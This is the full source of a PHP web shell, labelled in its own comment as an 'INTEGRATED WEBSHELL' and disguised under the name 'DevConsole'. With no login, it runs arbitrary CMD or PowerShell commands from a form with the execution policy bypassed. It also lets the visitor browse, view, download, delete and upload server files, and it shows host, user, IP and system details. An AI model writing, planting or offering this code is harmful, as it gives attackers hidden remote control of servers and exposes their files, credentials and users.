<?php
/**
 * DEV CONSOLE - INTEGRATED WEBSHELL (ENHANCED READABILITY)
 */

error_reporting(0);
putenv("PATH=C:\Windows\System32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\\");

$cwd = $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';

// Directory navigation
if (isset($_GET['dir'])) {
    $new_dir = $_GET['dir'];
    if (is_dir($new_dir)) { $cwd = realpath($new_dir); }
}

// File actions
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
        echo "<p style='color:green;'>Deleted $file</p>";
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
        exit;
    }
}

// Upload handling
if ($_FILES['upload']['tmp_name'] ?? false) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p style='color:green;'>Uploaded " . htmlspecialchars($dest) . " (" . $_FILES['upload']['size'] . " bytes)</p>";
    } else {
        echo "<p style='color:red;'>Upload failed!</p>";
    }
}

function exec_command($cmd, $mode, $cwd) {
    if (!$cmd) return 'Ready...';
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    if ($mode === 'powershell' && $isWin) {
        $psPath = is_dir('C:\\Windows\\Sysnative') 
            ? 'C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe' 
            : 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
            
        $fullCmd = "cd /d \"$cwd\" && $psPath -NoProfile -ExecutionPolicy Bypass -NonInteractive -Command \"$cmd\" 2>&1";
    } else {
        $prefix = $isWin ? "cd /d \"$cwd\" && " : "cd " . escapeshellarg($cwd) . " && ";
        $fullCmd = $prefix . $cmd . ' 2>&1';
    }
    
    return shell_exec($fullCmd) ?: "[System] No output returned.";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DevConsole V1</title>
    <style>
        :root { 
            --bg: #0f172a; --panel: #1e293b; --accent: #6366f1; 
            --text: #f1f5f9; --green: #22c55e; --font-size: 16px; 
        }
        body { 
            margin:0; font-family: 'Inter', 'Segoe UI', sans-serif; 
            background: var(--bg); color: var(--text); height:100vh; 
            display:flex; flex-direction: column; font-size: var(--font-size);
        }
        header { 
            background: var(--panel); padding: 15px 25px; 
            border-bottom: 2px solid #334155; display:flex; 
            justify-content: space-between; align-items: center; 
        }
        .header-title { font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; }
        .badge { 
            background: #000; padding: 6px 12px; border-radius: 6px; 
            font-size: 14px; font-family: monospace; margin-left: 10px; 
            color: var(--green); border: 1px solid #334155;
        }
        
        main { flex: 1; display: flex; gap: 20px; padding: 20px; overflow: hidden; }
        section { 
            background: var(--panel); border-radius: 12px; padding: 20px; 
            border: 1px solid #334155; overflow-y: auto; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
        }
        
        #files { flex: 1.2; }
        table { width: 100%; border-collapse: collapse; font-size: 15px; }
        th { text-align: left; padding: 12px; border-bottom: 2px solid #475569; color: #94a3b8; font-size: 14px; text-transform: uppercase; }
        td { padding: 12px; border-bottom: 1px solid #334155; font-family: 'Consolas', monospace; }
        tr:hover { background: #2d3748; }
        
        .btn { text-decoration: none; padding: 6px 12px; border-radius: 6px; font-size: 13px; color: #fff; font-weight: 600; }
        .btn-v { background: #3b82f6; } .btn-d { background: #10b981; } .btn-del { background: #ef4444; }
        .folder { color: #fbbf24; text-decoration: none; font-weight: bold; font-size: 16px; }

        #term-sec { flex: 1; display: flex; flex-direction: column; }
        #console { 
            flex: 1; background: #000; color: var(--green); padding: 20px; 
            border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; 
            font-size: 16px; overflow-y: auto; white-space: pre-wrap; 
            border: 1px solid #334155; line-height: 1.5;
        }
        .input-bar { display: flex; gap: 12px; margin-top: 20px; }
        input[type="text"], select { 
            background: #0f172a; border: 2px solid #475569; color: #fff; 
            padding: 12px; border-radius: 8px; outline: none; font-size: 16px; 
        }
        input[type="text"]:focus { border-color: var(--accent); }
        button { 
            background: var(--accent); color: #fff; border: none; 
            padding: 0 25px; border-radius: 8px; cursor: pointer; 
            font-weight: bold; font-size: 16px; transition: 0.2s;
        }
        button:hover { background: #4f46e5; transform: translateY(-1px); }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 10px; }
    </style>
</head>
<body>

<header>
    <div class="header-title">⚡ DEV_CONSOLE <span style="font-weight: 200; font-size: 1rem;">v1.0</span></div>
    <div>
    	<span class="badge">Hostname: <?php echo gethostname(); ?></span>
    	<span class="badge">User: <?php echo get_current_user(); ?></span>
        <span class="badge">IP: <?php echo gethostbyname(gethostname()); ?></span>
        <span class="badge" title="Full Path">Path: <?php echo realpath($cwd); ?></span>
        <span class="badge">Srv: <?php echo explode(' ', $_SERVER['SERVER_SOFTWARE'])[0]; ?></span>
    </div>
</header>

<main>
    <section id="files">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h3 style="margin:0; color: var(--accent);">📁 <?php echo htmlspecialchars($cwd); ?></h3>
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:10px;">
                <input type="file" name="upload" style="font-size: 13px;">
                <button type="submit" style="padding: 6px 15px; font-size:13px;">Upload</button>
            </form>
        </div>
        <table>
            <thead><tr><th>Name</th><th style="width:100px;">Size</th><th style="width:180px;">Actions</th></tr></thead>
            <tbody>
                <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname($cwd)); ?>" class="folder"> .. / Parent Directory</a></td></tr>
                <?php foreach(scandir($cwd) as $f): if($f=='.' || $f=='..') continue; $p=$cwd.DIRECTORY_SEPARATOR.$f; $d=is_dir($p); ?>
                <tr>
                    <td><?php echo $d ? "<a href='?dir=".urlencode($p)."' class='folder'>📂 $f</a>" : "📄 $f"; ?></td>
                    <td><span style="color:#94a3b8"><?php echo $d ? 'DIR' : round(filesize($p)/1024, 1).' KB'; ?></span></td>
                    <td>
                        <?php if(!$d): ?>
                            <a href="?view=<?php echo urlencode($p); ?>" target="_blank" class="btn btn-v">View</a>
                            <a href="?download=<?php echo urlencode($p); ?>" class="btn btn-d">Download</a>
                            <a href="?delete=<?php echo urlencode($p); ?>&dir=<?php echo urlencode($cwd); ?>" class="btn btn-del" onclick="return confirm('Delete?')">Del</a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
 	<div style="padding: 10px 15px; border-top: 1px solid #334155; background: rgba(0,0,0,0.1);">
        <span style="font-family: monospace; font-size: 13px; color: #94a3b8;">
            <strong>Sysinfo:</strong> <?php echo php_uname('a'); ?>
        </span>
    	</div>
    </section>

    <section id="term-sec">
        <h3 style="margin-top:0; color: var(--accent);">Terminal Output</h3>
        <div id="console"><?php 
            if($cmd) {
                echo "Executing: $cmd\n";
                echo str_repeat("=", 50) . "\n";
                echo htmlspecialchars(exec_command($cmd, $mode, $cwd));
            } else { echo "Terminal ready for input..."; }
        ?></div>
        <form method="post" class="input-bar">
            <select name="mode">
                <option value="shell" <?php echo $mode=='shell'?'selected':''; ?>>CMD</option>
                <option value="powershell" <?php echo $mode=='powershell'?'selected':''; ?>>PowerShell</option>
            </select>
            <input type="text" name="cmd" placeholder="Type a command (e.g. dir, whoami, ipconfig)..." style="flex:1;" autofocus autocomplete="off">
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <button type="submit">Execute</button>
        </form>
    </section>
</main>

<script>
    const c = document.getElementById('console');
    c.scrollTop = c.scrollHeight;
</script>
</body>
</html>
